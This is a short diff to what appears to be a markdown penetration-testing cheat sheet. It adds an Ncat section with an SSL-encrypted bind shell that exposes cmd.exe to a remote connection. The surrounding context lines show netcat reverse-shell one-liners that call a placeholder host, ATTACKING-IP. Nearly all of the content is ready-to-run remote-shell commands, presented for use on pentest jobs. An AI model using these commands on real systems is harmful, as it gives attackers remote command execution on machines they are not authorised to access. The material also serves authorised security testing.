@@ -58,6 +58,15 @@ nc -e /bin/sh ATTACKING-IP 80
 rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
 ```
 
+## Ncat
+Ncat is a better and more modern version of netcat. One feature it has that netcat does not have is encryption. If you are on a pentestjob you might not want to communicate unencrypted. 
+
+Bind
+```
+ncat --exec cmd.exe --allow 192.168.1.101 -vnl 555 --ssl
+ncat -v 192.168.1.103 5555 --ssl
+```
+
 ## Telnet
 
 ```
